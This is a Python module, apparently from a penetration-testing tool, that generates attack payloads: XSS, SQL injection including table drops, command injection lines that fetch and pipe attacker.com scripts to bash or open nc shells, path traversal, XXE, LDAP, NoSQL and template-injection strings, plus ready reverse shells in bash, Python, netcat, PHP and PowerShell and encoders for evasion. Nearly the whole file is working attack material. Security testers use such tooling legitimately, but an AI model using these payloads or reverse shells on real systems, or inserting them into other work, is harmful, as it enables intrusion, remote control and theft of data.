"""
Payload Generator Module

This module provides functionality for generating various types of security
testing payloads for different attack vectors and vulnerability types.
"""

import base64
import random
import string
import urllib.parse
from typing import Dict, List, Optional, Any

from app.logger import logger


class PayloadGenerator:
    """Security payload generation engine"""
    
    def __init__(self):
        """Initialize payload generator"""
        self.payload_templates = self._load_payload_templates()
    
    def _load_payload_templates(self) -> Dict[str, List[str]]:
        """Load payload templates for different attack types"""
        return {
            'xss': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "';alert('XSS');//",
                "\"><script>alert('XSS')</script>",
                "<iframe src=javascript:alert('XSS')>",
                "<body onload=alert('XSS')>",
                "<input onfocus=alert('XSS') autofocus>",
                "<select onfocus=alert('XSS') autofocus>"
            ],
            'sql_injection': [
                "' OR '1'='1",
                "' UNION SELECT NULL--",
                "'; DROP TABLE users--",
                "1' AND 1=1--",
                "admin'--",
                "' OR 1=1#",
                "1' OR '1'='1' /*",
                "' UNION SELECT username, password FROM users--",
                "1'; WAITFOR DELAY '00:00:05'--",
                "' AND (SELECT COUNT(*) FROM users) > 0--"
            ],
            'command_injection': [
                "; ls -la",
                "| whoami",
                "&& cat /etc/passwd",
                "`id`",
                "$(whoami)",
                "; ping -c 1 127.0.0.1",
                "| nc -e /bin/sh attacker.com 4444",
                "&& curl http://attacker.com/shell.sh | bash",
                "; wget http://attacker.com/backdoor.php",
                "| python -c 'import os; os.system(\"id\")'"
            ],
            'path_traversal': [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd",
                "....\\\\....\\\\....\\\\windows\\\\system32\\\\config\\\\sam",
                "/var/www/../../etc/passwd",
                "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
            ],
            'ldap_injection': [
                "*)(uid=*",
                "*)(|(uid=*))",
                "admin)(&(password=*))",
                "*))%00",
                "*()|%26'",
                "*)(&(objectClass=*))",
                "*)(cn=*)",
                "admin))(|(uid=*"
            ],
            'xml_injection': [
                "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
                "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % remote SYSTEM 'http://attacker.com/evil.dtd'>%remote;]>",
                "<![CDATA[<script>alert('XSS')</script>]]>",
                "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///c:/windows/system32/drivers/etc/hosts\">]><root>&xxe;</root>"
            ],
            'nosql_injection': [
                "'; return true; var dummy='",
                "' || '1'=='1",
                "{\"$ne\": null}",
                "{\"$regex\": \".*\"}",
                "{\"$where\": \"this.username == this.password\"}",
                "'; return this.username == 'admin' && this.password != 'admin'; var dummy='"
            ],
            'ssti': [
                "{{7*7}}",
                "${7*7}",
                "#{7*7}",
                "{{config}}",
                "{{request}}",
                "${T(java.lang.Runtime).getRuntime().exec('id')}",
                "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
                "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
            ],
            'xxe': [
                "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
                "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % remote SYSTEM 'http://attacker.com/evil.dtd'>%remote;]>",
                "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'expect://id'>]><root>&test;</root>"
            ]
        }
    
    def generate_xss_payloads(self, context: str = 'generic', encode: bool = False) -> List[str]:
        """
        Generate XSS payloads for different contexts
        
        Args:
            context: Context where payload will be used (generic, attribute, script, etc.)
            encode: Whether to encode the payloads
            
        Returns:
            List of XSS payloads
        """
        logger.info(f"Generating XSS payloads for context: {context}")
        
        base_payloads = self.payload_templates['xss'].copy()
        
        # Context-specific payloads
        if context == 'attribute':
            base_payloads.extend([
                "\" onmouseover=\"alert('XSS')\"",
                "' onfocus='alert(\"XSS\")' autofocus='",
                "\" onclick=\"alert('XSS')\" \"",
                "' onload='alert(\"XSS\")' '"
            ])
        elif context == 'script':
            base_payloads.extend([
                "';alert('XSS');//",
                "\";alert('XSS');//",
                "*/alert('XSS');//",
                "alert('XSS')"
            ])
        elif context == 'url':
            base_payloads.extend([
                "javascript:alert('XSS')",
                "data:text/html,<script>alert('XSS')</script>",
                "vbscript:alert('XSS')"
            ])
        
        # Encode payloads if requested
        if encode:
            encoded_payloads = []
            for payload in base_payloads:
                # URL encoding
                encoded_payloads.append(urllib.parse.quote(payload))
                # HTML entity encoding
                encoded_payloads.append(payload.replace('<', '&lt;').replace('>', '&gt;'))
                # Double URL encoding
                encoded_payloads.append(urllib.parse.quote(urllib.parse.quote(payload)))
            
            base_payloads.extend(encoded_payloads)
        
        return base_payloads
    
    def generate_sql_injection_payloads(self, db_type: str = 'generic') -> List[str]:
        """
        Generate SQL injection payloads for specific database types
        
        Args:
            db_type: Database type (mysql, postgresql, mssql, oracle, generic)
            
        Returns:
            List of SQL injection payloads
        """
        logger.info(f"Generating SQL injection payloads for: {db_type}")
        
        base_payloads = self.payload_templates['sql_injection'].copy()
        
        # Database-specific payloads
        if db_type == 'mysql':
            base_payloads.extend([
                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                "' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--",
                "' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
                "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--"
            ])
        elif db_type == 'postgresql':
            base_payloads.extend([
                "'; SELECT pg_sleep(5)--",
                "' UNION SELECT NULL,version(),NULL--",
                "' AND (SELECT SUBSTRING(version(),1,10))='PostgreSQL'--"
            ])
        elif db_type == 'mssql':
            base_payloads.extend([
                "'; WAITFOR DELAY '00:00:05'--",
                "' UNION SELECT NULL,@@version,NULL--",
                "' AND (SELECT SUBSTRING(@@version,1,1))='M'--"
            ])
        elif db_type == 'oracle':
            base_payloads.extend([
                "' UNION SELECT NULL,banner,NULL FROM v$version--",
                "' AND (SELECT COUNT(*) FROM user_tables)>0--"
            ])
        
        return base_payloads
    
    def generate_command_injection_payloads(self, os_type: str = 'linux') -> List[str]:
        """
        Generate command injection payloads for specific operating systems
        
        Args:
            os_type: Operating system type (linux, windows, generic)
            
        Returns:
            List of command injection payloads
        """
        logger.info(f"Generating command injection payloads for: {os_type}")
        
        base_payloads = self.payload_templates['command_injection'].copy()
        
        # OS-specific payloads
        if os_type == 'linux':
            base_payloads.extend([
                "; cat /etc/passwd",
                "| ps aux",
                "&& uname -a",
                "`cat /etc/shadow`",
                "$(cat /proc/version)",
                "; find / -name '*.conf' 2>/dev/null"
            ])
        elif os_type == 'windows':
            base_payloads.extend([
                "& dir",
                "| type C:\\Windows\\System32\\drivers\\etc\\hosts",
                "&& systeminfo",
                "`type C:\\boot.ini`",
                "$(Get-Process)",
                "; net user"
            ])
        
        return base_payloads
    
    def generate_reverse_shells(self, lhost: str, lport: int, shell_type: str = 'bash') -> List[str]:
        """
        Generate reverse shell payloads
        
        Args:
            lhost: Listener host IP
            lport: Listener port
            shell_type: Type of shell (bash, python, nc, etc.)
            
        Returns:
            List of reverse shell payloads
        """
        logger.info(f"Generating {shell_type} reverse shells for {lhost}:{lport}")
        
        shells = []
        
        if shell_type == 'bash':
            shells.extend([
                f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
                f"0<&196;exec 196<>/dev/tcp/{lhost}/{lport}; sh <&196 >&196 2>&196",
                f"/bin/bash -l > /dev/tcp/{lhost}/{lport} 0<&1 2>&1"
            ])
        
        elif shell_type == 'python':
            shells.extend([
                f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
                f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
            ])
        
        elif shell_type == 'nc':
            shells.extend([
                f"nc -e /bin/sh {lhost} {lport}",
                f"nc -e /bin/bash {lhost} {lport}",
                f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"
            ])
        
        elif shell_type == 'php':
            shells.extend([
                f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
                f"<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\"); ?>"
            ])
        
        elif shell_type == 'powershell':
            shells.extend([
                f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
            ])
        
        return shells
    
    def generate_encoded_payloads(self, payload: str, encoding_types: List[str] = None) -> Dict[str, str]:
        """
        Generate encoded versions of a payload
        
        Args:
            payload: Original payload to encode
            encoding_types: List of encoding types to apply
            
        Returns:
            Dictionary of encoded payloads
        """
        if encoding_types is None:
            encoding_types = ['url', 'base64', 'html', 'unicode', 'double_url']
        
        encoded = {}
        
        for encoding_type in encoding_types:
            try:
                if encoding_type == 'url':
                    encoded['url'] = urllib.parse.quote(payload)
                
                elif encoding_type == 'base64':
                    encoded['base64'] = base64.b64encode(payload.encode()).decode()
                
                elif encoding_type == 'html':
                    encoded['html'] = ''.join(f'&#x{ord(c):x};' for c in payload)
                
                elif encoding_type == 'unicode':
                    encoded['unicode'] = ''.join(f'\\u{ord(c):04x}' for c in payload)
                
                elif encoding_type == 'double_url':
                    encoded['double_url'] = urllib.parse.quote(urllib.parse.quote(payload))
                
                elif encoding_type == 'hex':
                    encoded['hex'] = '0x' + payload.encode().hex()
                
            except Exception as e:
                logger.warning(f"Failed to encode payload with {encoding_type}: {e}")
        
        return encoded
    
    def generate_polyglot_payloads(self) -> List[str]:
        """
        Generate polyglot payloads that work across multiple contexts
        
        Returns:
            List of polyglot payloads
        """
        logger.info("Generating polyglot payloads")
        
        polyglots = [
            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
            "'\"><img src=x onerror=alert('XSS')>",
            "\"><script>alert('XSS')</script>",
            "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//"
        ]
        
        return polyglots
    
    def generate_custom_payload(self, 
                               attack_type: str,
                               target_parameter: str,
                               custom_command: str = None) -> str:
        """
        Generate a custom payload for specific attack type
        
        Args:
            attack_type: Type of attack (xss, sqli, cmdi, etc.)
            target_parameter: Parameter name being targeted
            custom_command: Custom command to execute
            
        Returns:
            Custom generated payload
        """
        logger.info(f"Generating custom {attack_type} payload for parameter: {target_parameter}")
        
        if attack_type == 'xss':
            return f"<script>alert('XSS in {target_parameter}')</script>"
        
        elif attack_type == 'sqli':
            return f"' UNION SELECT '{target_parameter}', version(), user()--"
        
        elif attack_type == 'cmdi':
            if custom_command:
                return f"; {custom_command}"
            else:
                return f"; echo 'Command injection in {target_parameter}'"
        
        elif attack_type == 'path_traversal':
            return f"../../../etc/passwd#{target_parameter}"
        
        else:
            return f"test_payload_for_{target_parameter}"
    
    def get_payload_by_category(self, category: str) -> List[str]:
        """Get all payloads for a specific category"""
        return self.payload_templates.get(category, [])
    
    def get_all_categories(self) -> List[str]:
        """Get all available payload categories"""
        return list(self.payload_templates.keys())


# Example usage
def main():
    """Example usage of PayloadGenerator"""
    generator = PayloadGenerator()
    
    # Generate XSS payloads
    xss_payloads = generator.generate_xss_payloads(context='attribute', encode=True)
    print(f"Generated {len(xss_payloads)} XSS payloads")
    
    # Generate SQL injection payloads
    sql_payloads = generator.generate_sql_injection_payloads(db_type='mysql')
    print(f"Generated {len(sql_payloads)} SQL injection payloads")
    
    # Generate reverse shells
    shells = generator.generate_reverse_shells('10.0.0.1', 4444, 'bash')
    print(f"Generated {len(shells)} reverse shell payloads")
    
    # Generate encoded payloads
    encoded = generator.generate_encoded_payloads("<script>alert('test')</script>")
    print(f"Generated {len(encoded)} encoded variations")
    
    # Generate polyglot payloads
    polyglots = generator.generate_polyglot_payloads()
    print(f"Generated {len(polyglots)} polyglot payloads")


if __name__ == "__main__":
    main()